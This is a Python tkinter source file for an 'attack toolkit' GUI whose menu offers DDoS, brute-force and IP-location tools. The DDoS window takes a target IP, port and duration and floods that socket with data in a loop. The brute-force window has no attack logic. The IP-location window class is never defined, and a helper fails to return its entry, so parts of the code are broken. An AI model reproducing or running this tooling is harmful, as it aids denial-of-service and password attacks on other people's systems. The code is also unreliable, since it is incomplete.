import tkinter as tk
from tkinter import ttk
import threading
import socket
import time
import requests
from PIL import ImageTk, Image
import os

class AttackToolkit(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("AtTech Toolkit")
        self.geometry("600x400")
        self.configure(bg="#ffffff")
        self.resizable(True, True)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#ffffff", font=("Helvetica", 14))
        style.configure("TButton", font=("Helvetica", 14))

        try:
            self.logo_path = "logo.png"  # Change "logo.png" to your logo file path
            if os.path.exists(self.logo_path):
                self.logo = Image.open(self.logo_path)
                self.logo = self.logo.resize((100, 100), Image.ANTIALIAS)
                self.logo = ImageTk.PhotoImage(self.logo)
                self.label_logo = ttk.Label(self, image=self.logo)
                self.label_logo.pack(pady=20)
            else:
                print("Logo file not found.")
        except Exception as e:
            print("Error loading logo:", e)

        self.menu = tk.Menu(self)
        self.config(menu=self.menu)

        self.file_menu = tk.Menu(self.menu, tearoff=False)
        self.menu.add_cascade(label="File", menu=self.file_menu)
        self.file_menu.add_command(label="Exit", command=self.quit)

        self.tools_menu = tk.Menu(self.menu, tearoff=False)
        self.menu.add_cascade(label="Tools", menu=self.tools_menu)
        self.tools_menu.add_command(label="DDoS", command=self.open_ddos)
        self.tools_menu.add_command(label="Brute Force", command=self.open_brute_force)
        self.tools_menu.add_command(label="IP to Location", command=self.open_ip_to_location)

    def open_ddos(self):
        ddos_window = DDoSWindow(self)

    def open_brute_force(self):
        brute_force_window = BruteForceWindow(self)

    def open_ip_to_location(self):
        ip_to_location_window = IPToLocationWindow(self)

class DDoSWindow(tk.Toplevel):
    def __init__(self, master):
        super().__init__(master)
        self.title("DDoS Tool")
        self.geometry("400x250")
        self.configure(bg="#ffffff")
        self.resizable(False, False)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#ffffff", font=("Helvetica", 12))
        style.configure("TButton", font=("Helvetica", 12))

        ttk.Label(self, text="DDoS Tool", font=("Helvetica", 20), background="#ffffff").pack(pady=20)

        self.entry_ip = self.create_entry("Target IP:")
        self.entry_port = self.create_entry("Target Port:", pady=(10, 0))
        self.entry_duration = self.create_entry("Duration (seconds):", pady=(10, 0))

        ttk.Button(self, text="Start DDoS", command=self.start_ddos).pack(pady=(20,10), fill=tk.X)

    def create_entry(self, label_text, **kwargs):
        frame = ttk.Frame(self, padding=(50, 0))
        frame.pack(fill=tk.X, **kwargs)
        ttk.Label(frame, text=label_text, background="#ffffff").pack(side=tk.LEFT)
        entry = ttk.Entry(frame)
        entry.pack(side=tk.RIGHT, fill=tk.X, expand=True)
        return entry

    def start_ddos(self):
        target_ip = self.entry_ip.get()
        target_port = int(self.entry_port.get())
        duration = int(self.entry_duration.get())
        threading.Thread(target=self.ddos, args=(target_ip, target_port, duration)).start()

    def ddos(self, target_ip, target_port, duration):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            print(f"DDoS attack started on {target_ip}:{target_port} for {duration} seconds")
            start_time = time.time()
            while (time.time() - start_time) < duration:
                s.send(b'Data to flood the target with...')
                time.sleep(0.1)  # Sleep for 0.1 second to avoid freezing
            s.close()
            print("DDoS attack finished.")
        except Exception as e:
            print("Error: ", e)

class BruteForceWindow(tk.Toplevel):
    def __init__(self, master):
        super().__init__(master)
        self.title("Brute Force Tool")
        self.geometry("400x250")
        self.configure(bg="#ffffff")
        self.resizable(False, False)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#ffffff", font=("Helvetica", 12))
        style.configure("TButton", font=("Helvetica", 12))

        ttk.Label(self, text="Brute Force Tool", font=("Helvetica", 20), background="#ffffff").pack(pady=20)

        self.entry_url = self.create_entry("URL:")

    def create_entry(self, label_text, **kwargs):
        frame = ttk.Frame(self, padding=(50, 0))
        frame.pack(fill=tk.X, **kwargs)
        ttk.Label(frame, text=label_text, background="#ffffff").pack(side=tk.LEFT)
        entry = ttk.Entry(frame)
        entry.pack(side=tk.RIGHT, fill=tk.X, expand=True)

if __name__ == "__main__":
    app = AttackToolkit()
    app.mainloop()
